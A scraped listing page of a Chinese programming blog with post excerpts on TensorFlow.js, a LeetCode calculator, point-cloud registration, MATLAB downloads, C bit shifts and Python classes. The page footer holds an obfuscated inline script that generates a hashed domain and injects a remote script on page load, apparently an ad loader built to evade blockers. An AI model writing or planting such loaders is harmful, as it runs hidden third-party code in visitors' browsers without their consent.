</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd26cc5279599310cebeeeb11d383d97/" rel="bookmark">
			JavaScript武力值飙升！用TensorFlow.js轻松实现在浏览器里搞深度学习......
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近年来，AI 与人类的生活越来越紧密，慢慢变得无处不在。那么提到 AI ，我们会想到什么？小编最先想到的是机器人。早在小学作文中，我就写到 2021 年到处都是机器人，机器人汽车到处飞。结果 2021 年到来，这个想象的场景也没有实现。不过，虽然 2021 年还没有那么高科技，但是 AI 早已经渗透到我们的生活，无处不在，并且 AI 也使我们的生活变得更加丰富和便利。
举个我自己的例子，我原来很喜欢买口红，买口红之前都要试色，后来疫情来了，商场人多地方远，试口红又很不卫生，我就再也不敢试了。但是想买口红不试色的话怎么知道合不合适自己呢？后来我发现在浏览器中输入想买的口红品牌，在品牌官网里可以虚拟化妆，只要上传自己的照片，再点击想要的口红，自己的嘴唇就会变成口红的颜色，通过这种方式就可以找到自己合适的色号，买到喜欢的口红了。下面看一下我的实验效果。
（上图是小编的照片，下图是通过虚拟化妆改变唇色的图片）
虽然 520 已经过去了几天，但是每天都可以过成情人节。如果有的小哥哥想给女朋友偷偷买口红准备惊喜，又怕买到死亡色号被打的话，不防试试这个方法，可以有效降低被打概率（开个玩笑）。
前一段时间，谷歌推出了一款新的人工智能的试验网站叫“Move Mirror”，只需要你拥有装有网络摄像头的电脑或者手机，你就可以在 Web 浏览器中体验。当你对着电脑网络摄像头移动，只需 15 ms，电脑就会从收集的 8 万多张图片中调出与你相匹配的姿势图片（小编感觉很神奇）。
(本图出自谷歌官方，网址请见https://experiments.withgoogle.com/move-mirror）
那么有的朋友可能会好奇，“虚拟化妆” “Move Mirror” 都是用到了什么技术得以实现呢？其实这要归功于 TensorFlow.js——一个允许在浏览器中运行机器学习项目的 JavaScript 库。那么又有小伙伴会问，机器学习领域的大部分项目采用的都是传统的后端编程语言，为什么要把 JavaScript 与深度学习结合起来呢？
1. JavaScript 与深度学习结合的原因
因为在浏览器环境中用 JavaScript 进行深度学习有它独特的优势，相比后端编程语言也可以创造更多独特的机会。首先，Web 浏览器很灵活和易用，Web 浏览器拥有展示文本数据、图像数据、音频数据和视频数据的最全面的技术和API，所以用它来部署深度学习模型是很合理的选择。第二，相比而言，Web 浏览器的服务器开销更少。第三，客户端推断会将数据和计算都放在设备上，所以 Web 浏览器有更低的推断延迟。
另外，Web 浏览器可以保护客户数据隐私。比如上面提到的 “虚拟化妆” 和 “Move Mirror”，在使用过程中，可能有朋友会担心自己的照片被泄露，或者有的人想做一些夸张搞笑的动作玩得有意思一点，但是出于隐私怕被泄露而不敢尝试。其实所有的图像都在浏览器中生成，数据无须离开用户的手机，甚至无须存储下来，所以完全不用担心。
再者，Web 浏览器可以即时 GPU 加速，获得足够的算力。基于 WebGL 的神经网络加速，可以让 “Move Mirror” 里利用 PoseNet 从图像中提取人体姿态这样的实时推断成为可能。此外，还有可以随时使用，可以在各种生态的设备上运行，在数据可视化和互动方面丰富且成熟等优势。
2. 用 TensorFlow.js 库的原因
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd26cc5279599310cebeeeb11d383d97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8e47d840459e6d71aab414e82438597/" rel="bookmark">
			力扣解题思路：面试题 16.26. 计算器 纠错记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试题 16.26. 计算器 思路：
先看错误答案：
public int calculate(String s) { Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); char sign = ' '; int i = 0; int res = 0; while(i &lt; s.length()){ while(i &lt; s.length() &amp;&amp; Character.isDigit(s.charAt(i))){ res = res*10 + (s.charAt(i++) - '0'); } if (i == s.length() || (!Character.isDigit(s.charAt(i)) &amp;&amp; s.charAt(i) != ' ')) { if (sign == '+') stack.push(stack.pop() + res); else if (sign == '-') stack.push(stack.pop() - res); else if (sign == '*') stack.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8e47d840459e6d71aab414e82438597/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06cc1c7e317982957da886bd31549dd4/" rel="bookmark">
			3.5-点云配准基本数学原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		返回 &gt;&gt;&gt;&gt;&gt;&gt; PCL-3D点云总目录
概念基础 三维点云的配准即是通过对点云的旋转、平移进行对齐，进而得到一个4x4的变换矩阵，包含3x3的旋转矩阵和3x1的平移向量。旋转矩阵可以通过罗格里格斯变换成一个1x3的旋转向量，故而最终是6个变量。
常用的点云配准算法是：迭代最近点算法(ICP)，正态分布变换配准(NDT)，基于特征不变性的配准 (ORB/FPFH/NARF)
其他演变算法及不同思路算法：
ICP拓展：稳健ICP、point to plane ICP、point to line ICP、MBICP、GICP
NDT拓展：NDT 3D、Multil-Layer NDT
其他：4PCS、Super-4PCS、FPCS、KFPSC、SAC-IA、Line Segment Matching、ICL
ICP求解：四元数求解获得旋转矩阵、协方差矩阵求解SVD获得旋转矩阵
KD tree优化
NDT：probability density functions：PDF概率密度函数
矩阵：正交矩阵，协方差矩阵、雅克比矩阵、黑塞矩阵
概率统计：方差，标准差，正态分布，均匀分布
迭代最近点算法(ICP) 本例我们讲解基于奇异值分解（SVD）的方法求解迭代最近点算法（ICP）。目的是匹配两个点云集合。算出他们之间的变换关系。
除此之外还有基于四元数求解ICP。
求解步骤 1、求最大化目标函数
2、矩阵进行SVD奇异值分解
3、正定矩阵迹的性质
4、根据迹性质得出目标函数最大化时R的解
5、ICP结果注意
正态分布变换配准(NDT) NDT表示目标表面 直接使用点云来表示目标的表面是不够的，比如，点云不能显式的表示关于表面的信息（方向、平滑度、孔洞等）。根据数据采集器的不同，点云的内容也可能是低效的，需要大量不必要的存储信息。为了在远离数据采集器的地方能够得到足够的样本分辨率，通常需要采集大量的冗余数据。
正态分布变换（ Normal Distributions Transform ， NDT）是一种描述曲面的较好方式。该变换将点云映射到平滑的表面，通过一组局部概率密度函数 local probability density functions(PDFs)来描述，每个PDF描述了表面的一个小局域的形状。
该算法的第一部是将扫描到的内容所占据的空间分割成网格单元cells（2D下为正方形，3D下为正方体），然后基于每个cell内部点的分布，计算其PDF。每个单元cell中的PDF可以理解为内部点x
的生成器。换句话说，我们可以认为x的位置是由PDF生成的。
图6.1：一个2D的激光扫描仪在矿井坑道中扫描到的点，以及对应的PDFs描述的表面形状。本例中，每个小格子边长是2m，发光区域表示了高概率区域。PDFs只计算那些点数量大于5个的单元cell。
假设这些参考点云表面的点的位置是通过D维的随机正态分布过程生成的，那么这些测得的x点的PDF似然函数为：
图6.2：3D-NDT表面表示的隧道截面，从上面看。更亮、更密集的部分表示更高的概率。cell的边长为1米
正态分布给出了具有连续导数的点云的分段光滑表示。每个PDF都可以看作是局部表面的近似，描述了表面的位置以及它的方向和平滑度。二维激光扫描及其对应的正态分布如图6.1所示。图6.2描述了矿井巷道扫描的三维常规分布。
正态分布
由于目前的工作主要集中在正态分布上，让我们更仔细地研究一下单变量和多变量正态分布的特征。在一维情况下，一个标准随机正态分布的变量x具有一个确定的预期变量μ（均值）和一个用来表示不确定性的变量σ（方差）。
在2D和3D情况下，表面的方向信息和平滑度信息可以从协方差矩阵的特征向量和特征值中估算出来，特征向量描述了分布的主要部分：即一个正交向量集合，对应于各变量协方差的主方向。根据方差的比例，二维正态分布可以是点形(如果方差相似)或线形(如果一个比另一个大得多)，或者介于两者之间。在三维情况下，参见图6.4的描述，一个正态分布可以表现为一个点或球体（如果方差的大小在各个方向上差不多），一条线（如果一个方向的方差远远大于另两个方向）或一个平面（如果一个方向的方差远小于另两个方向）。
NDT扫描配准 scan registration
匹配准流程 2D-NDT 3D-NDT 注：以上文字和图片均来源于链接，若有侵权请联系转载方删除。
返回 &gt;&gt;&gt;&gt;&gt;&gt; PCL-3D点云总目录
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1ca9070d9f082982f6d40426e70df98/" rel="bookmark">
			如何用matlab批量下载oceancolor的数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 介绍 有时需要从NASA的OceanColor网站（https://oceancolor.gsfc.nasa.gov/）批量下载数据。
数据筛选好后会生成一个url的下载列表（建议使用L3级别的mapped格式）。
首先需要将url列表复制到一个txt文档中，然后直接用matlab脚本批量下载即可。
注意：OceanColor网站需要提前注册且登录，否则无权限下载。
2.代码 clear; clc close all url=cell2mat( textread('AQUA_url.txt','%s')); [a,b]=size(url); for k=1:a k web(url(k,:),'-browser'); end 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e17e17ab9e96c54c2ace10ee2c02b202/" rel="bookmark">
			c语言无符号整型右移,c语言 java 有符号数,无符号数. 左移,右移运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1: c语言区分有符号数,无符号数.有符号数是符号位在首位,无符号数首位就是普通位数. java只有有符号数,换句话说java二进制中首位都是符号位.0正1负.
2: 左移在所有语言中只是左移,不存在有符号无符号左移的说法,也不存在算数左移,逻辑左移的说法.算数移动(又叫有符号移动),逻辑移动(又叫无符号移动)都是指的右移,左移只有一种.
3: 先说左移
①: java中左移(java只支持有符号数). 首位不变,从第二位开始整体左移,右边补0,左边的扔掉.
当左移的运算数是int 类型时，每移动1位它的第31位就要被移出并且丢弃.当左移的运算数是long 类型时，每移动1位它的第63位就要被移出
并且丢弃.
②: c中的左移分为有符号数无符号数, 无符号数很简单,就是整体左移,左边扔点,右边补0. 有符号数的左移与上面说的java中的有符号左移类似.
③: 左移的数学意义.在数字没有溢出的前提下，对于正数和负数，左移一位都相当于乘以2的1次方，左移n位就相当于乘以2的n次方.
4: 再说右移: c中区分有符号数与无符号数,java只有有符号数.有符号数的右移区分有符号右移(算数右移)和无符号右移(逻辑右移).java只支持有符号
右移.所以不单独说,只说c的就可以了.
①: c语言中的无符号数只能是逻辑右移.没有符号位,也就不存在算数右移(有符号右移)的情况.计算非常简单.右移一位就是除2.
②: c语言中的有符号数可以算数右移也可以逻辑右移. 与java相似,java中的数字算数右移是&gt;&gt;,逻辑右移是&gt;&gt;&gt;. C中多数机器都是有符号
右移.
③: 对于有符号数的算数右移的方法是: 所有位数整体右移(包括符号位),每移动一位在最左边增加一个符号位(正数0负数1),最右边丢弃一位
经过测试,正数每算数右移一位就是除2. 负数的话不是除2.只是很相近而已.
④: 对于有符数的逻辑右移的方法是: 所有位数整体右移.高位补0. 测试情况:正数的情况下每逻辑右移一位就是除2.负数情况下,逻辑右移变正数
不具备数学意义.
总结: 对开发的影响是:
①: 左移在不溢出的情况下.正负数都是左移一位乘以2.
②: 右移:算数右移和逻辑右移:负数基本都没有实际意义,只有正数有意义,右移一位相当于除以2
原文：https://www.cnblogs.com/wangzhaosheng/p/13125992.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4401bc8528c2488533228978c1f0f4a/" rel="bookmark">
			继承和邮件自由发送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		继承和邮件自由发送 1.什么是继承 “”"
继承就是让子类直接拥有父类的属性和方法。
子类 - 继承者
父类 - 被继承者
“”"
2.继承的语法 “”"
class 类名(父类1, 父类2,…):
pass
定义类的时候如果没有写继承关系，那么这个类默认继承python的基类： object
class 类名: == class 类名(object):
“”"
# 子类继承父类的属性和方法 class Person: num = 61 def __init__(self): self.name = '小明' self.age = 18 self.gender = '男' def func1(self): print(f'{self.name}今年{self.age}岁！') @classmethod def func2(cls): print(f'人类的数量: {cls.num}') @staticmethod def func3(): print('人类破坏环境!') class Student(Person): pass print(Student.num) stu = Student() print(stu.name, stu.age, stu.gender) stu.func1() Student.func2() Student.func3() 3.子类中添加属性和方法 “”"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4401bc8528c2488533228978c1f0f4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb6056efcef79c19754f97ef3853b2a5/" rel="bookmark">
			面向对象基础总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象 类和对象 1.定义类（创建类）
“”"
定义类:用代码描述清楚你这个类是拥有哪些相同功能哪些相同属性的对象的集合。
功能 - 对应的是函数
属性 - 保存数据的变量（在类中叫属性）
语法：
class 类名:
类的说明文档
类的内容
说明：
class - 关键字，固定写法
类名 - 程序员自己命名
要求：是标识符，不是关键字
规范：见名知义；驼峰式命名(单词之间采用首字母大写),首字母大写; 不使用系统函数名、类名和模块名
: - 固定写法
类的说明文档 - 本质就是多行注释
类的内容 - 包括属性和方法
属性分为：类属性(类的字段)和对象属性
方法分为：对象方法、类方法和静态方法
注：方法就是定义在类中的函数
class Student: """ 学生类 """ pass 2.定义对象(创建对象) """ 语法: 类() """ stu1 = Student() stu2 = Student() print(stu1, stu2) 对象方法 1.方法
定义在类中函数就是方法
2.对象方法
“”"
怎么定义: 直接定义在类中的函数(定义函数前不用加装饰器)
怎么调用: 用对象来调用 - 对象.函数名()
特点: 自带参数self，在调用的时候self不用传参，系统会自动将当前对象传给self(谁调用self指向谁)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb6056efcef79c19754f97ef3853b2a5/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/194/">«</a>
	<span class="pagination__item pagination__item--current">195/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/196/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>